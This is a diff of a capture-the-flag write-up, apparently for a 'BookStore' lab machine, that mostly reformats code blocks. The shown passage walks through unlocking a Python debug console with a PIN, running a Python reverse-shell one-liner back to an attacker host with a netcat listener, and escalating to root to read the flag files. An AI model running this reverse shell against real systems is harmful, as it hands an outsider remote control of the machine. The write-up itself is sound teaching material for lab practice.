@@ -43,11 +43,16 @@ now that we got the PIN, let's use it to access the console
 
 looks like we have a Python interactive console, so let's use a Python payload to initiate a reverse shell
 
-```python import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")```
+```python
+import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+```
+
 used this cheatsheet https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
 
 before importing the payload into the console I opened a netcat on port 1234 
-```shell nc -lvnp 1234```
+```shell
+nc -lvnp 1234
+```
 
 after which I was able to login into the shell and found the user.txt file which was the first flag
 ![edited usertxt](https://github.com/achrafelkhatib/BookStore/assets/61394291/2a553a2d-c99a-454d-bbf7-77632a0858a9)
@@ -62,12 +67,15 @@ the following
 ![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/e85ab127-fbd4-4187-bf28-ebe355c633bc)
 
 now we have the code and the magic number however we need to do some calculations in order to find the full number, so in Python I did the following
+
 ![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/7e10926b-7ed3-4def-8b58-21ae79cb86fa)
 
 now that we have the magic number let's try running the script again and see what happens
+
 ![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/f39037a4-2750-42f1-96fb-e2d568dcb232)
 
 looks like now we are root, so on the hunt for the root.txt file which was found in the root directory under /root/root.txt 
+
 ![image](https://github.com/achrafelkhatib/BookStore/assets/61394291/cda7dd45-1872-4613-96cf-c13b7b10404b)
 
 now all we got to do is cat the file for the hex flag.
